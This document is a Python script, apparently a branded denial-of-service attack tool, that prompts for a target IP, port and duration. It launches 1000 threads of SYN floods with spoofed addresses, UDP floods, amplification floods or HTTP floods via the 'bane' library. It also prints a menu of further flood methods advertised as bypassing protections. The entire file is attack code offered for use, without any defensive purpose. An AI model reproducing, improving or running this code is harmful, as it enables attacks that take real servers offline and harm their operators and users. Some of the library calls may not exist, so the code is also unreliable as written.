import os
import sys
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
import bane
# import requests  # Uncomment if API calls are needed

# Initialize the console and colorama
os.system("mode con: cols=120 lines=40")
init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def gradient_text(text, start_color=(255, 0, 0), end_color=(128, 0, 0)):
    gradient_text = ""
    steps = len(text.splitlines())
    for i, line in enumerate(text.splitlines()):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / steps))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / steps))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / steps))
        gradient_text += f"\033[38;2;{r};{g};{b}m{line}\033[0m\n"
    return gradient_text

def display_vishal_banner():
    banner = """
 ██▒   █▓ ██▓  ██████  ██░ ██  ▄▄▄       ██▓     ▒█████    ▄████ 
▓██░   █▒▓██▒▒██    ▒ ▓██░ ██▒▒████▄    ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒
 ▓██  █▒░▒██▒░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▒██░    ▒██░  ██▒▒██░▄▄▄░
  ▒██ █░░░██░  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▒██░    ▒██   ██░░▓█  ██▓
   ▒▀█░  ░██░▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░██████▒░ ████▓▒░░▒▓███▀▒
   ░ ▐░  ░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ 
   ░ ░░   ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░  ░ ▒ ▒░   ░   ░ 
     ░░   ▒ ░░  ░  ░   ░  ░░ ░  ░   ▒     ░ ░   ░ ░ ░ ▒  ░ ░   ░ 
      ░   ░        ░   ░  ░  ░      ░  ░    ░  ░    ░ ░        ░ 
     ░                                                                                                   
    """
    print(gradient_text(banner, (255, 0, 0), (128, 0, 0)))

def show_methods():
    methods_info = """
        Available Attack Methods:

        [ Layer 4 UDP Methods ]
        udp-kr          UDP Flood for Korean Servers
        udp-raw         Sends Raw Packets with UDP protocol
        udp-pps         Sends a large amount of UDP packets to server
        udp-raknet      Amplified UDP attack

        [ Layer 4 TCP Methods ]
        tcp-ack         Sending heavy ACK packets to TCP server
        tcp-syn         SYN TCP attack Using Spoofed IP Addresses
        tcp-tls         Sends a large number of TLS connection requests
        tcp-killer      Sends TCP Packets That Are Too Heavy

        [ Layer 4 AMP Method ]
        amp-power       Powerful Amplified UDP Attack

        [ Layer 7 HTTP Methods ]
        http-autobypass HTTP Flood with strong bypass
        http-bypass     HTTP Flood with bypass
        http-rape       HTTP Flood with aggressive method
        http-bigrs      Simple HTTP Flood with Zombies
        http-raw        HTTP Flood with raw packets
        http-sentinel   HTTP Flood with aggressive method
        korea1          HTTP Flood for Korean Servers
    """
    print(gradient_text(methods_info, (255, 0, 0), (128, 0, 0)))

# Placeholder for API integration to enhance attack power
def integrate_api_power():
    # Replace with actual API call if available
    # response = requests.get("https://api.example.com/attack-power", params={"key": "YOUR_API_KEY"})
    # if response.status_code == 200:
    #     data = response.json()
    #     # Process data for enhanced attack configurations
    pass

# Function to perform SYN flood attack
def syn_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    client.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            ip_header = bane.create_ip_header(target_ip)
            tcp_header = bane.create_tcp_header(target_ip, target_port)
            packet = ip_header + tcp_header
            client.sendto(packet, (target_ip, 0))
        except Exception:
            continue

# Function to perform UDP flood attack
def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bane.generate_payload(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(payload, (target_ip, target_port))
        except Exception:
            continue

# Function for a powerful AMP attack
def powerful_amp_attack(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bane.generate_amplification_payload(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(payload, (target_ip, target_port))
        except Exception:
            continue

def monitor_attack(http_flooder_instance):
    while True:
        try:
            time.sleep(1)
            sys.stdout.write("\r{}Total: {} | {}Success => {} | {}Fails => {}{}".format(
                bane.Fore.BLUE,
                http_flooder_instance.counter + http_flooder_instance.fails,
                bane.Fore.GREEN, http_flooder_instance.counter,
                bane.Fore.RED, http_flooder_instance.fails,
                bane.Fore.RESET
            ))
            sys.stdout.flush()
            if http_flooder_instance.done():
                break
        except:
            break

def initiate_attack():
    while True:
        method = input(Fore.RED + "Root@Vishal: Enter Attack Method (or type 'show-methods' to view available methods): " + Fore.WHITE)
        if method.lower() == 'show-methods':
            show_methods()
            continue

        ip = input(Fore.RED + "Root@Vishal: Enter Target IP: " + Fore.WHITE)
        port = int(input(Fore.RED + "Root@Vishal: Enter Target Port: " + Fore.WHITE))
        duration = int(input(Fore.RED + "Root@Vishal: Enter Attack Duration (in seconds): " + Fore.WHITE))

        threads = 1000  # Automatically set to 1000 threads

        # Start attack based on method without additional startup messages
        if method in ['syn-flood', 'tcp-syn']:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    executor.submit(syn_flood, ip, port, duration)
        elif method in ['udp-flood', 'udp-raw']:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    executor.submit(udp_flood, ip, port, duration)
        elif method == 'amp-power':
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    executor.submit(powerful_amp_attack, ip, port, duration)
        else:
            # Use Bane HTTP-based methods
            http_flooder_instance = bane.HTTP_Spam(ip, p=port, timeout=30, threads=threads, duration=duration, tor=False, logs=False, method=method)
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    executor.submit(http_flooder_instance.start)
            monitor_attack(http_flooder_instance)

        break

if __name__ == "__main__":
    clear_screen()
    display_vishal_banner()
    initiate_attack()
